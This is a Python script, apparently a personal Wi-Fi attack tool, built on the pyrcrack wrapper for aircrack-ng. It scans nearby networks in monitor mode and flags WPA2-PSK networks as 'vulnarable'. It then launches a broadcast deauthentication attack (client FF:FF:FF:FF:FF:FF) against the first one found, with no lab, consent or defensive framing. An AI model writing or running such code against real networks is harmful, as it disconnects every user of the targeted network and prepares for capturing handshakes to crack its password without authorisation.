import asyncio

import pyrcrack

from rich.console import Console
from rich.prompt import Prompt

class Atol:
    def __init__(self):
        self.vulnarable_networks = []
        self.networks = []

    async def scan_for_targets(self, scan_time: int = 3) -> list:
        out = []
        airmon = pyrcrack.AirmonNg()
        interfaces = await airmon.interfaces
        print(interfaces[1])
        interface = interfaces[1]

        async with airmon(interface) as mon:
            async with pyrcrack.AirodumpNg() as pdump:
                counter = 0
                async for result in pdump(mon.monitor_interface):
                    #print(result)
                    if counter >= 3:
                        out = result
                        break
                    counter += 1
                    await asyncio.sleep(1)
        self.networks = out
        return out
    
    async def deauthenticate_target(self, bssid: str, client: str, count: int = 5):
        airmon = pyrcrack.AirmonNg()
        interfaces = await airmon.interfaces
        interface = interfaces[0]

        async with airmon(interface) as mon:
            async with pyrcrack.AireplayNg() as preplay:
                async with preplay(mon.monitor_interface) as replay:
                    await replay.deauth(bssid=bssid, client=client, count=count)
    
    def analyze_networks(self):
        for n in self.networks:
            if n["essid"] and n["encryption"] == "WPA+PSK/WPA+AES-CCM":
                self.vulnarable_networks.append(n)

    def get_wpa2_networks(self):
        return self.vulnarable_networks

a = Atol()
c = Console()

asyncio.run(a.scan_for_targets(10))
a.analyze_networks()

c.clear()
networks = a.get_wpa2_networks()
for n in networks:
    print(n)

asyncio.run(a.deauthenticate_target(bssid=networks[0]["bssid"], client="FF:FF:FF:FF:FF:FF", count=10))